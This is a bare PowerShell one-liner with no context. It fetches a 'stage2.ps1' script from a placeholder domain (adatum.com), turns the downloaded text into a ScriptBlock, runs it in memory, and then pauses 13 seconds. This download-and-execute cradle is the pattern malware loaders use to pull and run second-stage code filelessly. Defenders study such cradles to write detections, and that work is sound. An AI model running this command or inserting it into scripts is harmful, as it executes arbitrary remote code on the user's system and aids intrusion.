$TargetUrl = "https://adatum.com/stage2.ps1"; $PayloadText = (iwr $TargetUrl -UseBasicParsing).Content; [ScriptBlock]::Create($PayloadText).Invoke(); Start-Sleep -Seconds 13
